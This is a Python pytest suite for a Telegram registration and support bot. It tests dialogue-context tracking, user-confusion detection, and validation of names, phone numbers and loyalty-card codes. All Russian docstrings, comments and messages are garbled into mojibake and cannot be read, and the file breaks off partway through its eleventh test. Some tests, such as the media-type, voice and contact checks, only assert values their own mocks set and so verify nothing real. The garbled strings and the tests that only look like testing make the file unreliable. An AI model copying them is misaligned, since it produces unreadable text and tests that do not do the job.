"""
–ö–æ–º–ø–ª–µ–∫—Å–Ω–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏ –±–æ—Ç–∞ —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –¥–∏–∞–ª–æ–≥–∞,
—Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ç–∏–ø–æ–≤ –≤–≤–æ–¥–∞ –∏ –≥—Ä–∞–Ω–∏—á–Ω—ã—Ö —Å–ª—É—á–∞–µ–≤.

–¶–µ–ª–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è:
1. –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –¥–∏–∞–ª–æ–≥–∞ –º–µ–∂–¥—É —à–∞–≥–∞–º–∏
2. –ö–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è
3. –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–∞–∑–Ω—ã—Ö —Ç–∏–ø–æ–≤ –≤–≤–æ–¥–∞ (—Ç–µ–∫—Å—Ç, –≥–æ–ª–æ—Å, —Ñ–æ—Ç–æ, –∫–æ–Ω—Ç–∞–∫—Ç—ã, —Å—Ç–∏–∫–µ—Ä—ã)
4. –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –∏ –æ—à–∏–±–æ—á–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
5. –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Å–µ—Ö –ª–æ–≥–∏—á–µ—Å–∫–∏—Ö –≤–µ—Ç–≤–µ–π –∞–ª–≥–æ—Ä–∏—Ç–º–∞
6. –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–Ω—è—Ç–Ω–æ—Å—Ç–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
7. –û–±—Ä–∞–±–æ—Ç–∫–∞ –≥—Ä–∞–Ω–∏—á–Ω—ã—Ö —Å–ª—É—á–∞–µ–≤ –∏ –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω—ã—Ö —Å–∏—Ç—É–∞—Ü–∏–π
"""

from __future__ import annotations

import asyncio
import sys
import io
from pathlib import Path

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º UTF-8 –¥–ª—è stdout/stderr (–¥–ª—è Windows)
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
from unittest.mock import AsyncMock, Mock, patch
from datetime import datetime

import pytest
from aiogram import types, Bot, Dispatcher
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage

# –î–æ–±–∞–≤–ª—è–µ–º –ø—É—Ç—å –∫ –∫–æ—Ä–Ω—é –ø—Ä–æ–µ–∫—Ç–∞
sys.path.insert(0, str(Path(__file__).parent.parent))

from bot.handlers.registration import RegistrationHandler
from bot.handlers.common import CommonHandlers
from bot.handlers.support import SupportHandler
from bot.handlers.fallback import SmartFallbackHandler
from bot.context_manager import ContextManager, UserContext, UserAction
from bot.states import RegistrationStates, SupportStates
from services.cache import MultiLevelCache


class TestContextManager:
    """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–µ–∫—Å—Ç–æ–º –¥–∏–∞–ª–æ–≥–∞"""
    
    @pytest.fixture
    def context_manager(self):
        """–°–æ–∑–¥–∞–Ω–∏–µ —ç–∫–∑–µ–º–ø–ª—è—Ä–∞ –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞"""
        return ContextManager()
    
    @pytest.mark.asyncio
    async def test_context_creation_and_tracking(self, context_manager):
        """–¢–µ—Å—Ç 1: –°–æ–∑–¥–∞–Ω–∏–µ –∏ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        print("\nüß™ –¢–µ—Å—Ç 1: –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∏ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞")
        
        telegram_id = 123456789
        
        # –°–æ–∑–¥–∞–µ–º —Å–µ—Å—Å–∏—é
        session = await context_manager.get_or_create_session(telegram_id)
        assert session is not None, "‚ùå –°–µ—Å—Å–∏—è –Ω–µ —Å–æ–∑–¥–∞–Ω–∞"
        assert session.telegram_id == telegram_id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π telegram_id"
        assert session.current_context == UserContext.IDLE, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –Ω–∞—á–∞–ª—å–Ω—ã–π –∫–æ–Ω—Ç–µ–∫—Å—Ç"
        print("‚úÖ –°–µ—Å—Å–∏—è —Å–æ–∑–¥–∞–Ω–∞ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ")
        
        # –û–±–Ω–æ–≤–ª—è–µ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç –Ω–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é
        await context_manager.update_context(
            telegram_id, 
            UserContext.REGISTRATION, 
            UserAction.BUTTON_CLICK
        )
        
        session = await context_manager.get_or_create_session(telegram_id)
        assert session.current_context == UserContext.REGISTRATION, "‚ùå –ö–æ–Ω—Ç–µ–∫—Å—Ç –Ω–µ –æ–±–Ω–æ–≤–ª–µ–Ω"
        assert session.last_action == UserAction.BUTTON_CLICK, "‚ùå –î–µ–π—Å—Ç–≤–∏–µ –Ω–µ –∑–∞–ø–∏—Å–∞–Ω–æ"
        assert len(session.breadcrumbs) > 0, "‚ùå Breadcrumbs –Ω–µ –∑–∞–ø–∏—Å–∞–Ω—ã"
        print("‚úÖ –ö–æ–Ω—Ç–µ–∫—Å—Ç –æ–±–Ω–æ–≤–ª–µ–Ω –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ")
        print(f"   üìä Breadcrumbs: {session.breadcrumbs}")
    
    @pytest.mark.asyncio
    async def test_error_counting_and_confusion_detection(self, context_manager):
        """–¢–µ—Å—Ç 2: –ü–æ–¥—Å—á–µ—Ç –æ—à–∏–±–æ–∫ –∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∑–∞–ø—É—Ç–∞–Ω–Ω–æ—Å—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        print("\nüß™ –¢–µ—Å—Ç 2: –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥—Å—á–µ—Ç–∞ –æ—à–∏–±–æ–∫ –∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –∑–∞–ø—É—Ç–∞–Ω–Ω–æ—Å—Ç–∏")
        
        telegram_id = 987654321
        
        # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫
        await context_manager.increment_error_count(telegram_id)
        await context_manager.increment_error_count(telegram_id)
        await context_manager.increment_error_count(telegram_id)
        
        session = await context_manager.get_or_create_session(telegram_id)
        assert session.consecutive_errors == 3, "‚ùå –û—à–∏–±–∫–∏ –Ω–µ –ø–æ–¥—Å—á–∏—Ç—ã–≤–∞—é—Ç—Å—è"
        print(f"‚úÖ –°—á–µ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç: {session.consecutive_errors} –æ—à–∏–±–æ–∫")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∑–∞–ø—É—Ç–∞–Ω–Ω–æ—Å—Ç–∏
        mock_message = Mock(spec=types.Message)
        mock_message.from_user = Mock()
        mock_message.from_user.id = telegram_id
        mock_message.text = "???"
        mock_message.photo = None
        mock_message.contact = None
        
        mock_state = AsyncMock(spec=FSMContext)
        mock_state.get_state = AsyncMock(return_value="RegistrationStates:enter_name")
        
        is_confused = await context_manager.detect_user_confusion(
            telegram_id, 
            mock_message, 
            mock_state
        )
        
        assert is_confused, "‚ùå –ó–∞–ø—É—Ç–∞–Ω–Ω–æ—Å—Ç—å –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞"
        print("‚úÖ –°–∏—Å—Ç–µ–º–∞ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∑–∞–ø—É—Ç–∞–Ω–Ω–æ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
        
        # –°–±—Ä–∞—Å—ã–≤–∞–µ–º –æ—à–∏–±–∫–∏ –ø—Ä–∏ —É—Å–ø–µ—à–Ω–æ–º –¥–µ–π—Å—Ç–≤–∏–∏
        await context_manager.update_context(
            telegram_id,
            UserContext.REGISTRATION,
            UserAction.TEXT_INPUT
        )
        
        session = await context_manager.get_or_create_session(telegram_id)
        assert session.consecutive_errors == 0, "‚ùå –û—à–∏–±–∫–∏ –Ω–µ —Å–±—Ä–æ—à–µ–Ω—ã"
        print("‚úÖ –°—á–µ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫ —Å–±—Ä–∞—Å—ã–≤–∞–µ—Ç—Å—è –ø—Ä–∏ —É—Å–ø–µ—à–Ω–æ–º –¥–µ–π—Å—Ç–≤–∏–∏")
    
    @pytest.mark.asyncio
    async def test_smart_suggestions(self, context_manager):
        """–¢–µ—Å—Ç 3: –£–º–Ω—ã–µ –ø–æ–¥—Å–∫–∞–∑–∫–∏ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        print("\nüß™ –¢–µ—Å—Ç 3: –ü—Ä–æ–≤–µ—Ä–∫–∞ —É–º–Ω—ã—Ö –ø–æ–¥—Å–∫–∞–∑–æ–∫")
        
        telegram_id = 111222333
        
        mock_message = Mock(spec=types.Message)
        mock_message.from_user = Mock()
        mock_message.from_user.id = telegram_id
        mock_message.text = "–ø–æ–º–æ–≥–∏—Ç–µ"
        
        mock_state = AsyncMock(spec=FSMContext)
        mock_state.get_state = AsyncMock(return_value="RegistrationStates:enter_name")
        
        suggestion = await context_manager.get_smart_suggestion(
            telegram_id,
            mock_message,
            mock_state
        )
        
        assert suggestion is not None, "‚ùå –ü–æ–¥—Å–∫–∞–∑–∫–∞ –Ω–µ –ø–æ–ª—É—á–µ–Ω–∞"
        assert "message" in suggestion, "‚ùå –ù–µ—Ç —Ç–µ–∫—Å—Ç–∞ –ø–æ–¥—Å–∫–∞–∑–∫–∏"
        assert suggestion["context"] == "registration_name", "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ–¥—Å–∫–∞–∑–∫–∏"
        print(f"‚úÖ –ü–æ–ª—É—á–µ–Ω–∞ –ø–æ–¥—Å–∫–∞–∑–∫–∞: {suggestion['context']}")
        print(f"   üí° –°–æ–æ–±—â–µ–Ω–∏–µ: {suggestion['message'][:100]}...")


class TestRegistrationFlow:
    """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏"""
    
    @pytest.fixture
    def bot(self):
        """–ú–æ–∫ –±–æ—Ç–∞"""
        bot = Mock(spec=Bot)
        bot.token = "test_token"
        bot.download = AsyncMock()
        return bot
    
    @pytest.fixture
    def cache(self):
        """–ú–æ–∫ –∫–µ—à–∞"""
        cache = Mock(spec=MultiLevelCache)
        cache.get_or_set = AsyncMock(return_value=None)
        cache.invalidate = Mock()
        return cache
    
    @pytest.fixture
    def handler(self, bot, cache, tmp_path):
        """–°–æ–∑–¥–∞–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏"""
        return RegistrationHandler(
            upload_dir=tmp_path,
            cache=cache,
            bot=bot
        )
    
    @pytest.mark.asyncio
    async def test_name_validation_boundary_cases(self, handler):
        """–¢–µ—Å—Ç 4: –ì—Ä–∞–Ω–∏—á–Ω—ã–µ —Å–ª—É—á–∞–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∏–º–µ–Ω–∏"""
        print("\nüß™ –¢–µ—Å—Ç 4: –ü—Ä–æ–≤–µ—Ä–∫–∞ –≥—Ä–∞–Ω–∏—á–Ω—ã—Ö —Å–ª—É—á–∞–µ–≤ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∏–º–µ–Ω–∏")
        
        test_cases = [
            ("", False, "–ü—É—Å—Ç–∞—è —Å—Ç—Ä–æ–∫–∞"),
            ("–ê", False, "–û–¥–Ω–∞ –±—É–∫–≤–∞"),
            ("–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω", True, "–ö–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∏–º—è"),
            ("–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á", True, "–ü–æ–ª–Ω–æ–µ –∏–º—è"),
            ("John O'Connor-Smith", True, "–ò–º—è —Å –∞–ø–æ—Å—Ç—Ä–æ—Ñ–æ–º –∏ –¥–µ—Ñ–∏—Å–æ–º"),
            ("–ò–≤–∞–Ω123", False, "–ò–º—è —Å —Ü–∏—Ñ—Ä–∞–º–∏"),
            ("+79001234567", False, "–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤–º–µ—Å—Ç–æ –∏–º–µ–Ω–∏"),
            ("test@email.com", False, "Email –≤–º–µ—Å—Ç–æ –∏–º–µ–Ω–∏"),
            ("–ê" * 101, False, "–°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ –∏–º—è"),
            ("   ", False, "–¢–æ–ª—å–∫–æ –ø—Ä–æ–±–µ–ª—ã"),
        ]
        
        from utils.validators import validate_full_name, validate_phone
        
        for test_input, expected, description in test_cases:
            result = validate_full_name(test_input)
            status = "‚úÖ" if result == expected else "‚ùå"
            print(f"{status} {description}: '{test_input}' -> {result}")
            assert result == expected, f"–û—à–∏–±–∫–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏: {description}"
        
        # –°–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞: —Ç–µ–ª–µ—Ñ–æ–Ω –∫–∞–∫ –∏–º—è –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω
        phone_as_name = "+79001234567"
        is_phone = validate_phone(phone_as_name)
        assert is_phone, "‚ùå –¢–µ–ª–µ—Ñ–æ–Ω –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω"
        print("‚úÖ –¢–µ–ª–µ—Ñ–æ–Ω –≤–º–µ—Å—Ç–æ –∏–º–µ–Ω–∏ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç—Å—è")
    
    @pytest.mark.asyncio
    async def test_phone_validation_various_formats(self):
        """–¢–µ—Å—Ç 5: –í–∞–ª–∏–¥–∞—Ü–∏—è —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ñ–æ—Ä–º–∞—Ç–∞—Ö"""
        print("\nüß™ –¢–µ—Å—Ç 5: –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ñ–æ—Ä–º–∞—Ç–æ–≤ —Ç–µ–ª–µ—Ñ–æ–Ω–∞")
        
        from utils.validators import validate_phone
        
        test_cases = [
            ("+79001234567", True, "–°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç +7"),
            ("79001234567", True, "–ë–µ–∑ –ø–ª—é—Å–∞"),
            ("89001234567", True, "–§–æ—Ä–º–∞—Ç —Å 8"),
            ("+1234567890", True, "–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –¥–ª–∏–Ω–∞ (10)"),
            ("+123456789012345", True, "–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –¥–ª–∏–Ω–∞ (15)"),
            ("+7 900 123 45 67", False, "–° –ø—Ä–æ–±–µ–ª–∞–º–∏"),
            ("+7(900)123-45-67", False, "–° —Å–∫–æ–±–∫–∞–º–∏ –∏ –¥–µ—Ñ–∏—Å–∞–º–∏"),
            ("900-123-4567", False, "–ë–µ–∑ –∫–æ–¥–∞ —Å—Ç—Ä–∞–Ω—ã"),
            ("test", False, "–¢–µ–∫—Å—Ç –≤–º–µ—Å—Ç–æ –Ω–æ–º–µ—Ä–∞"),
            ("", False, "–ü—É—Å—Ç–∞—è —Å—Ç—Ä–æ–∫–∞"),
            ("+7900", False, "–°–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π"),
        ]
        
        for test_input, expected, description in test_cases:
            result = validate_phone(test_input)
            status = "‚úÖ" if result == expected else "‚ùå"
            print(f"{status} {description}: '{test_input}' -> {result}")
            assert result == expected, f"–û—à–∏–±–∫–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏: {description}"
    
    @pytest.mark.asyncio
    async def test_loyalty_card_validation(self):
        """–¢–µ—Å—Ç 6: –í–∞–ª–∏–¥–∞—Ü–∏—è –Ω–æ–º–µ—Ä–∞ –∫–∞—Ä—Ç—ã –ª–æ—è–ª—å–Ω–æ—Å—Ç–∏"""
        print("\nüß™ –¢–µ—Å—Ç 6: –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∫–∞—Ä—Ç—ã –ª–æ—è–ª—å–Ω–æ—Å—Ç–∏")
        
        from utils.validators import validate_loyalty_card
        
        test_cases = [
            ("ABC123", True, "–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –¥–ª–∏–Ω–∞ (6)"),
            ("ABC12345", True, "–°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç"),
            ("GOLD789VIP", True, "–¢–æ–ª—å–∫–æ –±—É–∫–≤—ã –∏ —Ü–∏—Ñ—Ä—ã"),
            ("12345678901234567890", True, "–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –¥–ª–∏–Ω–∞ (20)"),
            ("ABC", False, "–°–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π"),
            ("A" * 21, False, "–°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π"),
            ("abc123", False, "–ú–∞–ª–µ–Ω—å–∫–∏–µ –±—É–∫–≤—ã"),
            ("–ê–ë–í123", False, "–ö–∏—Ä–∏–ª–ª–∏—Ü–∞"),
            ("ABC-123", False, "–° –¥–µ—Ñ–∏—Å–æ–º"),
            ("ABC 123", False, "–° –ø—Ä–æ–±–µ–ª–æ–º"),
            ("", False, "–ü—É—Å—Ç–∞—è —Å—Ç—Ä–æ–∫–∞"),
        ]
        
        for test_input, expected, description in test_cases:
            result = validate_loyalty_card(test_input)
            status = "‚úÖ" if result == expected else "‚ùå"
            print(f"{status} {description}: '{test_input}' -> {result}")
            assert result == expected, f"–û—à–∏–±–∫–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏: {description}"


class TestContentTypeHandling:
    """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ç–∏–ø–æ–≤ –∫–æ–Ω—Ç–µ–Ω—Ç–∞"""
    
    @pytest.mark.asyncio
    async def test_unexpected_media_types_in_name_step(self):
        """–¢–µ—Å—Ç 7: –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω—ã—Ö —Ç–∏–ø–æ–≤ –º–µ–¥–∏–∞ –Ω–∞ —à–∞–≥–µ –≤–≤–æ–¥–∞ –∏–º–µ–Ω–∏"""
        print("\nüß™ –¢–µ—Å—Ç 7: –ù–µ–æ–∂–∏–¥–∞–Ω–Ω—ã–µ —Ç–∏–ø—ã –º–µ–¥–∏–∞ –Ω–∞ —à–∞–≥–µ –≤–≤–æ–¥–∞ –∏–º–µ–Ω–∏")
        
        # –°–æ–∑–¥–∞–µ–º –º–æ–∫ —Å–æ–æ–±—â–µ–Ω–∏–π —Å —Ä–∞–∑–Ω—ã–º–∏ —Ç–∏–ø–∞–º–∏ –∫–æ–Ω—Ç–µ–Ω—Ç–∞
        test_cases = [
            ("photo", "—Ñ–æ—Ç–æ"),
            ("sticker", "—Å—Ç–∏–∫–µ—Ä"),
            ("voice", "–≥–æ–ª–æ—Å–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ"),
            ("video", "–≤–∏–¥–µ–æ"),
            ("document", "–¥–æ–∫—É–º–µ–Ω—Ç"),
            ("contact", "–∫–æ–Ω—Ç–∞–∫—Ç"),
            ("location", "–≥–µ–æ–ª–æ–∫–∞—Ü–∏—è"),
        ]
        
        for content_type, description in test_cases:
            print(f"   üîç –ü—Ä–æ–≤–µ—Ä–∫–∞: {description}")
            mock_message = Mock(spec=types.Message)
            mock_message.from_user = Mock()
            mock_message.from_user.id = 123456
            
            # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∏–ø –∫–æ–Ω—Ç–µ–Ω—Ç–∞
            for ct in ["photo", "sticker", "voice", "video", "document", "contact", "location"]:
                setattr(mock_message, ct, ct == content_type)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –±–æ—Ç —Ä–∞—Å–ø–æ–∑–Ω–∞–µ—Ç –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω—ã–π —Ç–∏–ø
            if content_type == "photo":
                assert mock_message.photo, f"‚ùå {description} –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω"
            elif content_type == "sticker":
                assert mock_message.sticker, f"‚ùå {description} –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω"
            
            print(f"   ‚úÖ {description.capitalize()} –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è")
    
    @pytest.mark.asyncio
    async def test_voice_message_handling(self):
        """–¢–µ—Å—Ç 8: –û–±—Ä–∞–±–æ—Ç–∫–∞ –≥–æ–ª–æ—Å–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"""
        print("\nüß™ –¢–µ—Å—Ç 8: –û–±—Ä–∞–±–æ—Ç–∫–∞ –≥–æ–ª–æ—Å–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π")
        
        mock_message = Mock(spec=types.Message)
        mock_message.from_user = Mock()
        mock_message.from_user.id = 123456
        mock_message.voice = Mock()
        mock_message.voice.file_id = "voice_file_id"
        mock_message.text = None
        mock_message.photo = None
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –≥–æ–ª–æ—Å–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
        assert mock_message.voice is not None, "‚ùå –ì–æ–ª–æ—Å–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ"
        assert mock_message.voice.file_id is not None, "‚ùå File ID –Ω–µ –Ω–∞–π–¥–µ–Ω"
        print("‚úÖ –ì–æ–ª–æ—Å–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ —Ä–∞—Å–ø–æ–∑–Ω–∞–µ—Ç—Å—è")
        print(f"   üìé File ID: {mock_message.voice.file_id}")
    
    @pytest.mark.asyncio
    async def test_contact_sharing_on_phone_step(self):
        """–¢–µ—Å—Ç 9: –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–Ω—Ç–∞–∫—Ç–∞ –Ω–∞ —à–∞–≥–µ –≤–≤–æ–¥–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞"""
        print("\nüß™ –¢–µ—Å—Ç 9: –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–Ω—Ç–∞–∫—Ç–∞ –Ω–∞ —à–∞–≥–µ —Ç–µ–ª–µ—Ñ–æ–Ω–∞")
        
        mock_message = Mock(spec=types.Message)
        mock_message.from_user = Mock()
        mock_message.from_user.id = 123456
        mock_message.contact = Mock()
        mock_message.contact.phone_number = "+79001234567"
        mock_message.text = None
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É –∫–æ–Ω—Ç–∞–∫—Ç–∞
        assert mock_message.contact is not None, "‚ùå –ö–æ–Ω—Ç–∞–∫—Ç –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω"
        assert mock_message.contact.phone_number is not None, "‚ùå –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω"
        
        phone = mock_message.contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        from utils.validators import validate_phone
        assert validate_phone(phone), "‚ùå –ù–æ–º–µ—Ä –∏–∑ –∫–æ–Ω—Ç–∞–∫—Ç–∞ –Ω–µ –≤–∞–ª–∏–¥–µ–Ω"
        print("‚úÖ –ö–æ–Ω—Ç–∞–∫—Ç –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è")
        print(f"   üì± –ù–æ–º–µ—Ä: {phone}")


class TestErrorHandlingAndRecovery:
    """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫ –∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è"""
    
    @pytest.mark.asyncio
    async def test_multiple_validation_errors(self):
        """–¢–µ—Å—Ç 10: –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –ø–æ–¥—Ä—è–¥"""
        print("\nüß™ –¢–µ—Å—Ç 10: –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏")
        
        from utils.validators import validate_full_name
        
        error_count = 0
        incorrect_inputs = [
            "123",
            "test@email",
            "–∞",
            "+7900",
            "!!!",
        ]
        
        for inp in incorrect_inputs:
            if not validate_full_name(inp):
                error_count += 1
                print(f"   ‚ùå –û—à–∏–±–∫–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏: '{inp}'")
        
        assert error_count == len(incorrect_inputs), "‚ùå –ù–µ –≤—Å–µ –æ—à–∏–±–∫–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã"
        print(f"‚úÖ –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ {error_count} –æ—à–∏–±–æ–∫ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∏–∑ {len(incorrect_inputs)}")
    
    @pytest.mark.asyncio
    async def test_state_recovery_after_errors(self):
        """–¢–µ—Å—Ç 11: –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è –ø–æ—Å–ª–µ –æ—à–∏–±–æ–∫"""
        print("\nüß™ –¢–µ—Å—Ç 11: –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è")
        
        context_manager = ContextManager()
        telegram_id = 555666777
        
        # –°–∏–º—É–ª–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏
        for i in range(3):
            await context_manager.increment_error_count(telegram_id)
        
        session = await context_manager.get_or_create_session(telegram_id)
        initial_errors = session.consecutive_errors
        assert initial_errors == 3, "‚ùå –û—à–∏–±–∫–∏ –Ω–µ –Ω–∞–∫–∞–ø–ª–∏–≤–∞—é—Ç—Å—è"
